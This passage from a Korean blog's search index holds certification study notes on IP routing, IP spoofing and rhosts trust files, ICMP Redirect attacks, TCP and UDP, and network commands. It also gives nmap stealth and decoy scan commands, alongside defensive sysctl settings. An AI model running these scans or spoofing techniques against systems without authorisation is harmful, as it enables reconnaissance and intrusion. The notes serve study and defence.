게이트웨이 식별용)                                               Flags                                    U : Route is Up (라우트 활성화)                   G : Use Gateway (게이트웨이 사용중)                   H : Target is a Host (목적지가 Host를 의미)                                               Interface                                    Eth0                                                                   Class 개념 (목적지 호스트, 네트워크 주소)                            Class A : 0~126 (127.0.0.1 : Loopback)                                    0+7bit(네트워크주소)+3Byte(호스트주소)                   사설 IP : 10.0.0.0 ~ 10.255.255.255                                               Class B : 128~191                                    10 + 14bit (네트워크주소) + 2Byte(호스트주소)                   사설 IP : 172.16.0.0 ~ 172.31.255.255                                               Class C : 192~223                                    110 + 21bit (네트워크주소) + 1Byte(호스트주소)                   사설 IP : 192.168.1.1 ~ 192.168.255.255                                               Class D               Class E                                                netstat -rn 결과 예시                                                                  No                   Destination                   Gateway                   Genmask                   Flags                   Interface                                                                                   1                   10.0.96.100                   10.0.120.1                   255.255.255.255                   UGH                   eth0                                                     2                   10.0.64.0                   10.0.120.2                   255.255.224.0                   UG                   eth0                                                     3                   10.0.64.0                   10.0.120.3                   255.255.192.0                   UG                   eth0                                                     4                   0.0.0.0                   10.0.120.5                   0.0.0.0                   UG                   eth0                                                                          IP Routing 계산                                    목적지 주소 10.0.96.100                                            일치 항목 있음                       Genmask 와 &amp;연산                                                    00001010 00000000 01100000 01100100                           11111111 11111111 11111111 11111111                           -----------------------------------                           00001010 00000000 01100000 01100100                           10. 0. 120. 1 로 패킷 전송                                                                                                           목적지 주소 10.0.122.100                                            일치 항목 없음                       IP 가 10으로 시작 : class A                       Genmask 와 &amp;연산                                                    00001010 00000000 01111010 01100100                           11111111 11111111 11111110 00000000                           -----------------------------------                           00001010 00000000 01111010 00000000                           불일치                           00001010 00000000 01111010 01100100                           11111111 11111111 11111110 00000000                           -----------------------------------                           00001010 00000000 01111010 00000000                           불일치                           00001010 00000000 01111010 01100100                           11111111 11111111 11000000 00000000                           -----------------------------------                           00001010 00000000 01000000 00000000                           10.0.120.3 로 패킷 전송                                                                                                                                                                           IP Spoofing      개요            IP를 속여서 공격하는 기법       시스템 간의 신뢰(trust) 관계를 이용 : ID/PW 인증 없이 접속       신뢰관계에 있는 클라이언트를 연결 불가능 상태(DoS) 로 만든다       공격자가 클라이언트 IP 주소로 위조하여 서버에 접속           리눅스의 신뢰관계 설정            /etc/host.equiv : 시스템 전체에 영향                    [+|-] [host_name(IP/호스트명)] [user_name(호스트별 사용자명)]           호스트에 접속하는 사용자의 접근을 허용           + : 모든 호스트에 대한 접근 허용 (ID, PW 인증필요)                            + user_name : 해당하는 유저에게 모든 호스트 접근 허용               + @group : 모든 호스트에 대해 해당 group 사용자로 접근 허용               + + : 모든 호스트에 대해서 모든 계정을 신뢰 (매우 취약)                                   - : 차단                            - host_name : 해당하는 사용자의 접근을 차단                                   host_name : 특정 호스트에 대한 접근 허용                            host_name -user_name : 해당 호스트에서 특정 사용자만 접근 차단               host_name user_name : 해당 호스트에서 특정 사용자의 접근 허용                                               홈 디렉토리 내 .rhost : 각 사용자별로 영향       취약점 대응책                    되도록 $HOME.rhost, /etc/host.equiv 사용 X           파일 소유자 root, 권한 600 변경           + 설정 제거, 반드시 필요한 host와 계정만 등록                           r 계열 서비스 (신뢰관계 서비스 - 인증없이 원격접속) : rlogin, rexec, rsh            cat /etc/xinetd.d/rlogin       service xinetd restart                                                       netstat -antp               grep 513                                               취약점 대응책                    Trust 관계 설정 없애기           Trust 관계 유지해야 한다면 MAC 주소 정적(Static) 구성           r 계열 서비스 사용 X                           IPv6 주소      개요            IPv4 한계점 해결을 위해 등장                    주소 공간의 고갈           최소 지연과 자원의 예약 불가           암호화와 인증기능 미제공                       IPv6 장점                    주소 공간 확대           헤더 단순화           주소 설정 간편           보안성 강화           모바일 IP 지원 개선                       IPv6 전환기술                    Dual Stack : IPv4 와 IPv6 를 동시 사용           터널링 : IPSec 기능 기본 제공                            IPv6 를 IPv4 로 캡슐화 후 IPv4 네트워크 통과                                   주소변환/헤더변환                            IPv4, IPv6 간 전환기능                                               IPv4 : 32bit, IPv6 : 128bit       네트워크 주소 : 64bit       인터페이스 주소 : 64 bit           ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","네트워크"],
        "url": "https://bluesplatter.com/is_certification/IS-Network-IP_Protocol/",
        "teaser": null
      },{
        "title": "정보보안 - 네트워크 ICMP 프로토콜",
        "excerpt":"   ICMP 프로토콜            개요                    3계층 프로토콜                            IP : 신뢰할 수 없는 프로토콜               ICMP : 에러발생 원인, 네트워크 상태 등 리포트                                   기능                            Error Message 기능               Query Message (네트워크 상태 조회)                                   Type 필드 (Meesage 종류)           Code 필드 (Type 에 속하는 세부 내용)                       헤더 구조                    Type : 8bit : ICMP 메시지 유형/용도                            Type 3 : Destination Unreachable                                   Code : 8bit : ICMP 메시지의 세부 내용                            Code 3 : Port Unreachable (상대방 UDP 포트가 열려있지 않음 등)                                   checksum : 16bit : ICMP 메시지 자체 오류에 대한 검사를 위함           Rest of header : 타입, 코드에 따라 추가되는 헤더가 있을 경우           Data Section : 데이터 영역                       메시지 유형                    Error Message                            Type 3 : Destination Unreachable                                    Code 1 (Host Unreachable) : 목적지 호스트로 패킷 전송 실패                   Code 2 (Protocol Unreachable) : 목적지에서 특정 프로토콜을 사용할 수 없을 때                   Code 3 (Port Unreachable) : UDP 포트가 열려있지 않을 때                   Code 4 (Fragmentation needed) : DF Flag bit 이 1로 설정되어 있을 때 단편화를 해야만 하는 경우 리턴 메시지                                               Type 5 : Redirection : 라우팅 경로가 잘못되어 새 경로로 보내야 할 경우                                    ICMP Redirect 공격 시 이용할 수 있는 Msg                                               Type 11 : Time exceeded : 시간초과                                    시간 초과 시 패킷 전부 폐기                   Code 0 : TTL = 0                   Code 1 : Fragment Reassembly time exceeded                                                                   Query Message                            Type 8 : Echo (ping) Request                                    Identifier : 식별자                   Sequence number : 메시지 순번                                               Type 0 : Echo (ping) Reply                                    Identifier : 식별자                   Sequence number : 메시지 순번                   Request 와 쌍이 맞아야 함                                                                                   ICMP Redirect 공격            개요                    ICMP Redirection Message (Type5)를 이용           패킷의 경로를 재설정           해당 메시지를 수신한 호스트는 자신의 라우팅 테이블을 변경           이러한 특성을 이용하여 ICMP Redirect 메시지를 공격자가 만듦           패킷이 자신에게 오도록 유도하여 스니핑을 함                       ARP Redirect 공격과의 비교                    ARP Cache Table을 변경, 스니핑                       예시                    공격자 IP : 192.168.120.110           수신자                            IP : 192.168.120.100               Default Gateway : 192.168.120.1                                   ICMP Redirection Message : 라우팅 경로가 잘못 되었을 때 Host 에게 알려주는 메시지           IP Packet을 Router / Gateway 가 전달 받고 경로가 잘못되었을 때 ICMP Redirection Message 를 송신           공격자는 Src IP를 게이트웨이 IP (192.168.120.1) 로 위조하고 수신자 (192.168.120.100) 에게 ICMP Redirection 메시지를 전송                            메시지의 목적지 주소 (예: 10.10.10.10) 의 Gateway 주소를 자신의 주소 (192.168.120.110) 으로 설정하여 전송                                   수신자는 공격을 받은 이후 Routing table 에 잘못된 정보를 생성                            Dest: 10.10.10.10               Netmask : 255.255.255.255               Gateway : 192.168.120.110               Interface : 192.168.120.100                                               대처방법                    ICMP Redirect (Type 5) 메시지 자체에 취약점을 가지고 있음           ICMP Redirect Message 에 라우팅 테이블이 변경되지 않도록 설정 (옵션해제)                            리눅스                                    sysctl (커널 매개변수 변경 등) (런타임 적용)                   vi 편집기로 /etc/sysctl.conf 변경 후 sysctl -p 로 적용                   #echo \"net.ipv4.conf.[all|eth0|lo].accept_redirects=0\" &gt;&gt; /etc/sysctl.conf                                            송신 차단 : send_redirects                                                                                                           sysctl                            커널의 매개변수 변경 등에 사용               sysctl [옵션] [커널매개변수]                                    -a : 모든 변수 표시                   -w : write -&gt; 변수값 설정                   -p : 수정된 파일의 적용                                               예 : ping 신호 차단                                    sysctl -w net.ipv4.icmp_echo_ignore_all=1                   vi 편집기로 /etc/sysctl.conf 의 net.ipv4.icmp_echo_ignore_all=1 설정                   #echo \"net.ipv4.icmp_echo_ignore_all=1\" &gt;&gt; /etc/sysctl.conf                                                                                  ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","네트워크"],
        "url": "https://bluesplatter.com/is_certification/IS-Network-ICMP_Protocol/",
        "teaser": null
      },{
        "title": "정보보안 - 네트워크 TCP 프로토콜",
        "excerpt":"TCP 프로토콜     개요            연결지향적 프로토콜 (Connection Oriented Protocol)                    논리적 연결 통로를 먼저 생성 후 통신           순서 제어 : 데이터 전송순서 보장                       Stream 기반 전송방식                    정해진 크기로 전송하지 않고 임의의 크기로 나눔           연속적으로 데이터 전송                       신뢰할 수 있는 프로토콜 (Reliable Protocol)                    흐름 제어 (Flow Control)                            송신측 버퍼가 500 Byte, 수신측 버퍼가 100 Byte 일 때 수신측 버퍼가 받을 수 있는 데이터만큼 전송               슬라이딩 윈도우 (Sliding Window)                                    기본                                            송신 측에서 수신 측에 Segment 를 전송                       수신 측은 송신 측에 Ack (데이터 받았음) 을 전송                       반복 -&gt; RTT (Round Trip Time : 왕복시간) 가 증가함                                                           수신측 Window Size 에 기반한 전송                                            수신 측 Window Size 에 기반해 Ack 확인 없이 연속적으로 데이터를 전송                       Throughtput 증가                                                                                                           오류 제어 (Error Control)                            오류, 누락(손실) 이 발생할 경우 재전송 (Retransmission) 수행                                   혼잡 제어 (Congestion Control)                            네트워크가 혼잡하여 효율이 떨어질 경우               네트워크 혼잡도에 따라 Data 의 양을 조절               네트워크 혼잡도 판단 기준                                    Data 의 손실 유무로 판단                                                                                   TCP 헤더 (20~60Bytes)            Source Port (16Bit) : 출발지 포트       Destination Port (16Bit) : 목적지 포트       Sequence Number (32Bit) : 시작 바이트 순번                    ISN (Initial Sequence Number) : 초기순서번호, 송/수신 측에서 연결할 때 미리 주고받음           ISN + 전송한 데이터의 바이트           전송한 데이터가 없을 경우 1씩 증가                       Acknowledgement Number (32Bit) : 상대방이 다음에 전달할 순서번호, ACK 와 함께 보냄       Data Offset(HLEN) : 20~60Byte 에 해당하는 값       Reserved : 예약, 사용안함       Control Flags (6Bit)                    UAPRSF                            SYN + ACK : 010010                                   URG : 긴급데이터           ACK : 수신확인응답           PSH : 송수신 버퍼에 있는 Data 를 즉시 처리           RST : Reset the connection - 연결 강제종료           SYN : Synchronize Sequence Number - 시퀀스 넘버 동기화 / 연결설정           FIN : 연결 정상종료                       Window : Window Size - 수신받을 수 있는 버퍼 공간                    수신측에서 송신측이 알 수 있도록 보내는 리시버 윈도우 사이즈           Window Sliding 제어방식에 쓰임                       Checksum : 헤더를 포함한 전체 Segment 에 대한 오류검사에 활용       Urgent Pointer : Segment 가 긴급 데이터를 포함하는 경우 긴급 데이터의 위치값                    사용하기 위해서 URG Flag 가 설정되어야 함.                           TCP 의 MSS            IP 의 경우 Fragment 의 단편화 기준 MTU (Maximum Transmission Unit)                    IP Header + IP Payload                       TCP 의 경우 Segment 의 분할 (Segmentation) -&gt; 재조합 (Reassembly)                    MSS : Maximum Segment Size           TCP 헤더를 제외한 TCP Payload 부           크기값은 MTU 환경에 영향을 받게 됨                           TCP 연결            논리적 연결 설정 -&gt; 데이터 전송 (송수신) (재전송 포함) -&gt; 연결 종료       ACK 의 의미 : 다음에 받을 SYN No       연결 설정 : 3-Way Handshake (논리적 연결설정 과정)                    Client : Active Open 상태           Server : Passive Open 상태           Client : SYN 패킷 전송                            ISN 포함 = Seq No:100               Window = Receiver Window Size (RWND) : 65535                                   Client : SYN_SENT           Server : SYN_RCVD (SYN_RECEIVED, SYN_RECV)           Server : SYN + ACK 패킷 전송 (010010)                            ISN 포함 = Seq No:200               ACK : 101               Window = Receiver Window Size (RWND) : 65535                                   Client : ESTABLISHED (연결설정완료)           Client : ACK 패킷 전송                            Seq : 101               ACK : 201               RWND : 65535                                   SERVER : ESTABLISHED (연결설정완료)                       TCP 데이터 송수신                    Client : ESTABLISHED 상태           Server : ESTABLISHED 상태           Client : ACK + PSH (011000)                            Seq : 102 (3-Way Handshake 에 이어서)               ACK : 201               Data : 102~300 (Byte 순번) 에 해당하는 내용                                   Client : ACK + PSH (011000)                            Seq : 301 (3-Way Handshake 에 이어서)               ACK : 201               Data : 301~400 (Byte 순번) 에 해당하는 내용                                   Server : ACK                            Seq : 201               ACK : 401               Data : 201~300                                   Client : ACK                            Seq : 401               ACK : 301               RWND : 2000                                               TCP 재전송 (Retransmission) 과정                    Client : A Data 전송                            RTO : Retransmission Time Out - A Data 재전송 Timer 동작                                   Client : B Data 전송 (Window Sliding)                            RTO : Retransmission Time Out - B Data 재전송 Timer 동작                                   (B Data 전송 실패)           Server : A Data ACK 전송           (Client : B Data RTO 초과)           Client : B Data 재전송                            RTO 가 지나 재전송하는 경우 네트워크가 매우 혼잡한 상태로 판단               혼잡 제어 (Congestion Control) 와 연관                                   Server : B Data ACK 전송                       빠른 재전송 (Fast Retransmission) 과정                    Client : A Data 전송           Client : B Data 전송 (Window Sliding)           (B Data 전송 실패)           Server : A Data ACK 전송           Client : C Data 전송 (Window Sliding)           Server : B Data 요청 ACK 전송                            C Data 는 Seq no 가 맞지 않음.                                   Client : D Data 전송 (Window Sliding)           Server : B Data 요청 ACK 전송           Client : E Data 전송 (Window Sliding)           Server : B Data 요청 ACK 전송           (B Data 요청 ACK 3번 중복)           Client : B Data 재전송                            재전송보다 덜 혼잡한 상태로 판단\\                                               연결종료                    3 Way Handshake                            대게는 클라이언트 요청에 의해서 연결 종료               Client : Active Close 상태               Server : Passive Close 상태               Client : FIN 패킷 전송 (000001)                                    Seq : xx                   ACK : yy                                               Server : FIN + ACK 패킷 전송 (010001)                                    Seq : yy                   ACK : xx+1                                               Client : CLOSE 상태               Client : ACK 패킷 전송                                    Seq : xx+1                   ACK : yy+1                                               Server : CLOSE 상태                                   4 Way Handshake (절반폐쇄/절반종료 방식)                            Client : Active Close 상태               Server : Passive Close 상태               Client : FIN + ACK 패킷 전송 (010001)                                    Seq : xx                   ACK : yy                                               Client : FIN_WAIT_1 상태               Server : ACK 패킷 전송 (010001)               Server : CLOSE_WAIT 상태               Client : FIN_WAIT_2 상태               Server : 서버 APP 이 TCP 연결 종료               Server : FIN + ACK 패킷 전송 (010001)                                    Seq : yy                   ACK : xx+1                                               Server : LAST_ACT 상태               Client : TIME_WAIT 상태               Client : (일정시간 경과-2MSL 후) CLOSE 상태               Client : ACK 패킷 전송                                    Seq : xx+1                   ACK : yy+1                                               Server : CLOSE 상태                                               연결 요청 거부                    Client : Active Open 상태           Client : SYN 패킷 전송           Client : SYN_SENT 상태           Server 가 Listen (포트 대기상태) 상태가 아님           Server : RST+ACK (010100) 패킷 전송           Client : CLOSED 상태                       연결중단 (Abort)                    Client : ESTABLISHED 상태           Server : ESTABLISHED 상태           Client : RST+ACK (010100) 패킷 혹은 RST(000100) (상대방에게 받은 패킷에 Ack Number 필드가 설정됨) 전송           Server : CLOSED 상태                           Port            전송계층 (TCP, UDP)                    Process to Process 통신           프로세스를 식별하기 위해 포트 사용                       분류방식                    사용목적에 따른 포트범위                            Well-Known Port : 예약된 포트 (0~1023)                                    FTP (21,22)                   Telnet (23)                   HTTP (80)                                               Registered Port : 제조사에서 IANA(Internet Assigned Number Authority) 에 용도를 등록 (1024~49151)                                    MySQL (3306)                   Oracle (1521)                   MSSQL (1433)                                               Dynamic Port : 동적으로 사용, Client (49152~65535)                                   사용권한에 따른 포트범위                            관리자 포트 (Privileged Port) (0~1023)               Unprivileged Port (2014~65535)                                                   TCP Session Hijacking      연결설정을 위해 주고 받는 정보를 스니핑   중간에서 값을 스푸핑 하여 전송   ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","네트워크"],
        "url": "https://bluesplatter.com/is_certification/IS-Network-TCP_Protocol/",
        "teaser": null
      },{
        "title": "정보보안 - 네트워크 UDP 프로토콜",
        "excerpt":"UDP 프로토콜     개요            전송계층, TCP 와 함께 대표되는 프로토콜       비연결형 프로토콜 : 연결이 수립되지 않음 (Connectionless Protocol)                    연결설정 과정 (예: 3 Way Handshake) 이 없음           Datagram 전송시마다 주소정보를 설정해서 전송           데이터 순서를 보장하지 않음                       비신뢰형 프로토콜 : 전송을 신뢰할 수 없음 (Unreliable Protocol)                    TCP의 제어기능 등이 없음                            Flow control               Error control               Congestion control                                   상위 어플리케이션에 대한 식별기능 (IP, Port)                       Datagram 전송기반                    데이터를 정해진 크기로 전송                           장점            전송속도가 빠름 (단순, 가벼움)       대용량 송수신 부적절하나 한번의 패킷전송으로 송수신 완료되는 서비스에 적합                    DNS (53/UDP)           DHCP (67,68/UDP)                                헤더 구조              이미지 출처              Total Length : Header 와 Data 를 합친 길이       Checksum : 전체 Datagram 오류검사 필드          ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","네트워크"],
        "url": "https://bluesplatter.com/is_certification/IS-Network-UDP_Protocol/",
        "teaser": null
      },{
        "title": "정보보안 - 네트워크 명령어",
        "excerpt":"ping 명령어     개요            ICMP 프로토콜 사용                    Echo Request (Type:8)           Echo Reply (Type:0)                       반응이 있을 경우 통신연결이 된다 (포트가 열려있다) 는 의미       보안상의 이유로 destination 에서 서비스를 하지 않을 수 있음           윈도우            ping -n 5 -l 128 www.korea.com                    -n : 패킷 전송 횟수 (Default : 4)           -l : 패킷 크기 설정 (Default : 32Bytes)                           리눅스 / 유닉스            ping -c 5 -s 128 www.korea.com                    -c : 패킷 전송 횟수 (Default : 무한대)           -s : 패킷 크기 설정 (Default : 56Bytes)                           traceroute 명령어     개요            경로를 추적하고, 상태 및 흐름을 파악하기 위함 (라우터의 문제점을 찾아내기 위함)       ICMP 프로토콜을 사용       네트워크 계층 (L3/Router) 를 거치면서 패킷을 전송       각 구간별 중계속도, 연결 상태 등을 알 수 있음       TTL 값을 1씩 증가시켜 진단함       라우터는 TTL 값을 감소시키고, TTL 값이 0이 되면 패킷을 폐기                    Type 11 : ICMP Time Exceeded 응답값 ()                            Code 0 : TTL exceeded                                               최종목적지 도달                    Type 0 : ICMP Echo Reply                       포트가 닫혀있을 경우                    Type 3 : ICMP Destination Unreachable                            Code 3 : Port Unreachable                                               응답시간 * 로 표기                    보안상의 이유로 패킷을 무시할 수 있음           실제로 구간에 문제가 발생한 경우                           윈도우            tracert       ICMP Request 패킷 이용                    ICMP Echo Request (Type 8)                       TTL 값을 1씩 증가시켜 진단함           리눅스            traceroute       UDP 패킷 (33434/UDP) 이용       TTL 값을 1씩 증가시켜 진단함           netstat 명령어     개요            확인 정보                    열려져 있는 포트           서비스 중인 프로세스들의 상태정보           네트워크 연결 상태                       옵션                    No Option : ESTABLISHED(연결상태) 소켓 정보           -a : 모든 소켓의 상태 정보           -i : 네트워크 인터페이스 정보           -r : 시스템 라우팅 테이블 정보           -s : 각 프로토콜별 (TCP, UDP, ICMP …) 통계정보           -n : 네트워크 주소를 숫자로 표현           -u : UDP           -t : TCP                       결과값                    Recv-Q : 수신버퍼에 저장된 데이터 크기           Send-Q : 송신버퍼에 저장된 데이터 크기           Local Address : 로컬호스트의 소캣 주소           Foreign Address : 원격호스트의 IP:포트           Status : 소켓 상태           i 옵션 결과값                            RX : Received (수신받음)               TX : Transmitted (전송)               OK : 오류없는 패킷               ERR : 에러 패킷               DRP : 폐기 패킷               OVR : 오버플로우로 폐기된 패킷                                                   ifconfig 명령어     개요            ifconfig : interface config (리눅스/유닉스)                    인터페이스 설정 정보           ip 정보           서브넷 마스크                       ipconfig (윈도우)           내용            Link encap : Ethernet       HWaddr 00:0c:29:3c:73:32 -&gt; MAC Address       inet : IP주소       UP : 현재 인터페이스 활성화       Metric : 라우팅 경로의 효율성/우선순위, 클수록 비용이 큼       RX : Received (수신받음)       TX : Transmitted (전송)           Promiscuous 모드            설정 시 : ifconfig eth0 promisc                    UP BROADCAST RUNNING PROMISC MULTICAST                       로그파일                    /var/log/message                            시간 localhost kernel : device eth0 entered promiscuous mode                                               해제 시 : ifconfig eth0 -promisc                    UP BROADCAST RUNNING MULTICAST                       로그파일                    /var/log/message                            시간 localhost kernel : device eth0 left promiscuous mode                                                   nmap     개요            포트스캐닝 툴, 호스트나 네트워크를 스캐닝       시스템 보안 툴인 동시에 해킹 툴로 사용될 수 있음           예시            nmap -sP xxx.xxx.xxx.xxx : Ping Scan (ICMP)                    활성화 되어있으면 응답 받음                       nmap -sP -p 80 xxx.xxx.xxx.xxx : Port 옵션                    -pT:21,23,110,U:53 : TCP 21,23,110, UDP 53번 포트 스캔                       nmap -sT xxx.xxx.xxx.xxx : TCP Connection Open           옵션            -sT : 일반적 TCP 포트 스캐닝 (connect(open))       -sS : half open 스캔 (추적 어려움)       -sP : ping을 이용한 일반적인 스캔       -sU : UDP 포트 스캐닝       -sA : TCP ACK Scan       -sN : TCP Null Scan       -sF : TCP FIN Scan       -sX : TCP XMAS Scan       -PO : 대상 호스트에 대한 ping 응답을 요청하지 않음 (log 기록, filtering 회피)       -PT : 일반적인 ICMP ping이 아닌 ACK 패킷으로 ping을 보내고 RST 패킷으로 응답을 받음       -PI : 일반적인 ICMP ping 으로 방화벽이나 필터링에 의해 걸러짐       -PB : ping을 할 때 ICMP ping 과 TCP ping 을 동시에 이용       -PS : ping을 할 때 ACK 패킷 대신 SYN 패킷을 보내 스캔       -O : 대상 호스트의 OS 판별       -p : 대상 호스트의 특정 포트를 스캔하거나 스캔할 포트의 범위 지정 (1-1024)       -D : Decoy 기능으로 대상 호스트에게 스캔을 실행한 호스트의 주소를 속임       -F : /etc/services 파일 내에 기술된 포트만 스캔       -I : TCP 프로세서의 identd 정보를 가져옴       -n : IP 주소를 DNS 호스트명으로 바꾸지 않는다. 속도가 빠르다.       -R : IP 주소를 DNS 호스트명으로 바꿔서 스캔. 속도가 느리다.       -o : 스캔 결과를 텍스트 파일로 저장                    -oN : 스캔결과 파일로 출력           -oX : 스캔결과 XML로 출력           -oG : Grepable (grep, awk) 파일 형식으로 출력                       -i : 스캔 대상 호스트의 정보를 지정한 파일에서 읽어서 스캔       -h : 도움말 보기           TCP Connect(Open) 스캔     개요            connect() 함수를 이용하여 각 포트별로 접속, 스캔하는 방식       포트가 열린 상태이면 연결완료 후 종료       포트가 닫혀있으면 RST+ACT 패킷이 옴       시스템 로그가 남게 됨           과정            열려있는 경우                    Attacker : SYN 전송           Target : SYN+ACK 전송           Attacker : ACK 전송           Attacker : RST+ACK 전송                       닫혀있는 경우                    Attacker : SYN 전송           Target : RST+ACK 전송                       방화벽에 의한 차단                    Attacker : SYN 전송           Target                            무응답               ICMP 메시지 (Destination Unreachable)               filtered 메시지                                                   nmap            telnet, http 포트 확인 : nmap -sT -p 23,80 xxx.xxx.xxx.xxx           TCP SYN(Half-Open) 스캔     개요            관리자 권한을 가지고 있어야 수행 가능       완전 연결 설정과정을 수행하지 않기에 Half-Open(반 열림) 스캔이라 함       시스템 로그가 남지 않기 때문에 Stealth Scan 이라 함           과정            열려있는 경우                    Attacker : SYN 전송           Target : SYN+ACK 전송           Attacker : RST 전송                            원칙은 ACK 전송, 강제로 Control Flag 를 변경-관리자권한               UAPRSF (000100)                                               닫혀있는 경우와 방화벽 차단은 위와 동일           nmap            telnet, http 포트 확인 : nmap -sS -p 23,80 xxx.xxx.xxx.xxx           TCP FIN 스캔     개요            스텔스 스캔 방식의 하나       TCP 헤더의 flag 비트를 비정상적으로 설정해서 스캔하는 방식 (관리자권한)       TCP 표준의 허점을 이용                    포트 상태가 CLOSED 이면 요청 세그먼트에 대한 응답으로 RST 를 보낸다.           OPEN 상태이면 RST 가 오지 않음                           과정            열려있는 경우                    Attacker : FIN 전송           Target : 응답없음                       닫혀있는 경우                    Attacker : FIN 전송           Target : RST+ACK 전송                           nmap            telnet, http 포트 확인 : nmap -sF -p 23,80 xxx.xxx.xxx.xxx           TCP NULL 스캔     개요            스텔스 스캔 방식의 하나       연결되어 있지 않은 포트에 아무 플래그 비트를 설정하지 않은 탐지패킷 전송       열린 포트 : 응답이 없음       닫힌 포트 : RST+ACK 전송           과정            열려있는 경우                    Attacker : 패킷 전송 (No Flag) - UAPRSF (000000)           Target : 응답 없음                       닫혀있는 경우                    Attacker : 패킷 전송 (No Flag) - UAPRSF (000000)           Target : RST+ACK 전송                           nmap            telnet, http 포트 확인 : nmap -sN -p 23,80 xxx.xxx.xxx.xxx           TCP Xmas 스캔     개요            스텔스 스캔방식의 하나       여러가지 플래그를 활성화 해 전송       연결되어 있지 않은 포트에 FIN, URG, PSH 플래그 비트를 설정하여 탐지패킷 전송                    UAPRSF : 101001                       열린 포트 : 응답이 없음       닫힌 포트 : RST+ACK 전송           과정            열려있는 경우                    Attacker : FIN+URG+PSH 플래그 전송 (UAPRSF - 101001)           Target : 응답 없음                       닫혀있는 경우                    Attacker : FIN+URG+PSH 플래그 전송 (UAPRSF - 101001)           Target : RST+ACK 전송                           nmap            telnet, http 포트 확인 : nmap -sX -p 23,80 xxx.xxx.xxx.xxx           TCP ACK 스캔     개요            포트의 Open 여부보다는 방화벽의 필터링 방식을 확인하기 위함           방화벽 필터링 방식            Packet Filtering (패킷 필터링) 방화벽                    deny, allow                            IP 주소 (소스, 목적지)               포트번호 (소스, 목적지)               트래픽 방향               프로토콜의 형태                                   전송 / 네트워크 계층 차단 방식                            TCP/IP 헤더 부분을 이용한 침입차단               수동적 방화벽                                   응용 계층 차단 (응용 게이트웨이) 방식                            프록시 (소프트웨어) 기능을 이용                                    패킷의 IP 주소와 서비스 종류에 따라 내부 네트워크 보호                                               능동적 방화벽                                               Stateful Inspection (상태기반) 방화벽                    패킷 필터링 방화벽과 마찬가지로 동일한 패킷정보 검토                            SYN 패킷인 경우                                   상태 테이블 관리                            TCP 연결에 관한 정보를 기록               TCP 번호 추적                                   DataLink 계층에서 상태 테이블을 확인하고, 허용된 패킷만 통과시킴                            SYN 패킷이 아닌 경우                                               NAT (Network Address Translation) 를 이용한 방화벽           과정            필터링 하는 경우                    응답 없음 (Stateful Inspection 방화벽 가능성이 높음)           ICMP 메시지                       필터링 하지 않는 경우                    RST + ACK 패킷                           UDP 스캔     개요            ICMP Unreachable 메시지를 이용하여 UDP 포트 오픈 여부 확인       열린 포트 : UDP 응답 or 응답 없음       닫힌 포트 : ICMP 메시지 응답           과정            열려있는 경우                    Attacker : UDP           Target : UDP 응답 or 응답 없음                       닫혀있는 경우                    Attacker : UDP           Target : ICMP Unreachable (Type : 3, Code : 3)                           nmap            DNS 서비스 UDP 스캔 : nmap -sU -p 53 xxx.xxx.xxx.xxx       NTP 서비스 UDP 스캔 : nmap -sU -p 123 xxx.xxx.xxx.xxx           Decoy 스캔     개요            위조된 주소로 스캔하는 방식       다양한 IP로 스캐너 주소를 위조, 관리자가 누가 스캔하는지 알아채기 어려움           nmap            nmap -sS -p 23,80 192.168.120.100 -D 192.168.150.1, 192.168.150.2                    src – SYN –&gt; 192.168.120.100:23/80           192.168.150.1 – SYN –&gt; 192.168.120.100:23/80 (Decoy)           192.168.150.2 – SYN –&gt; 192.168.120.100:23/80 (Decoy)                          ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","네트워크"],
        "url": "https://bluesplatter.com/is_certification/IS-Network-Commands/",
        "teaser": null
      },{
        "title": "정보보안 - 네트워크 포트 스캔",
        "excerpt":"ping 명령어     개요            ICMP 프로토콜 사용                    Echo Request (Type:8)           Echo Reply (Type:0)                       반응이 있을 경우 통신연결이 된다 (포트가 열려있다) 는 의미       보안상의 이유로 destination 에서 서비스를 하지 않을 수 있음           윈도우            ping -n 5 -l 128 www.korea.com                    -n : 패킷 전송 횟수 (Default : 4)           -l : 패킷 크기 설정 (Default : 32Bytes)                           리눅스 / 유닉스            ping -c 5 -s 128 www.korea.com                    -c : 패킷 전송 횟수 (Default : 무한대)           -s : 패킷 크기 설정 (Default : 56Bytes)                           traceroute 명령어     개요            경로를 추적하고, 상태 및 흐름을 파악하기 위함 (라우터의 문제점을 찾아내기 위함)       ICMP 프로토콜을 사용       네트워크 계층 (L3/Router) 를 거치면서 패킷을 전송       각 구간별 중계속도, 연결 상태 등을 알 수 있음       TTL 값을 1씩 증가시켜 진단함       라우터는 TTL 값을 감소시키고, TTL 값이 0이 되면 패킷을 폐기                    Type 11 : ICMP Time Exceeded 응답값 ()                            Code 0 : TTL exceeded                                               최종목적지 도달                    Type 0 : ICMP Echo Reply                       포트가 닫혀있을 경우                    Type 3 : ICMP Destination Unreachable                            Code 3 : Port Unreachable                                               응답시간 * 로 표기                    보안상의 이유로 패킷을 무시할 수 있음           실제로 구간에 문제가 발생한 경우                           윈도우            tracert       ICMP Request 패킷 이용                    ICMP Echo Request (Type 8)                       TTL 값을 1씩 증가시켜 진단함           리눅스            traceroute       UDP 패킷 (33434/UDP) 이용       TTL 값을 1씩 증가시켜 진단함           netstat 명령어     개요            확인 정보                    열려져 있는 포트           서비스 중인 프로세스들의 상태정보           네트워크 연결 상태                       옵션                    No Option : ESTABLISHED(연결상태) 소켓 정보           -a : 모든 소켓의 상태 정보           -i : 네트워크 인터페이스 정보           -r : 시스템 라우팅 테이블 정보           -s : 각 프로토콜별 (TCP, UDP, ICMP …) 통계정보           -n : 네트워크 주소를 숫자로 표현           -u : UDP           -t : TCP                       결과값                    Recv-Q : 수신버퍼에 저장된 데이터 크기           Send-Q : 송신버퍼에 저장된 데이터 크기           Local Address : 로컬호스트의 소캣 주소           Foreign Address : 원격호스트의 IP:포트           Status : 소켓 상태           i 옵션 결과값                            RX : Received (수신받음)               TX : Transmitted (전송)               OK : 오류없는 패킷               ERR : 에러 패킷               DRP : 폐기 패킷               OVR : 오버플로우로 폐기된 패킷                                                   ifconfig 명령어     개요            ifconfig : interface config (리눅스/유닉스)                    인터페이스 설정 정보           ip 정보           서브넷 마스크                       ipconfig (윈도우)           내용            Link encap : Ethernet       HWaddr 00:0c:29:3c:73:32 -&gt; MAC Address       inet : IP주소       UP : 현재 인터페이스 활성화       Metric : 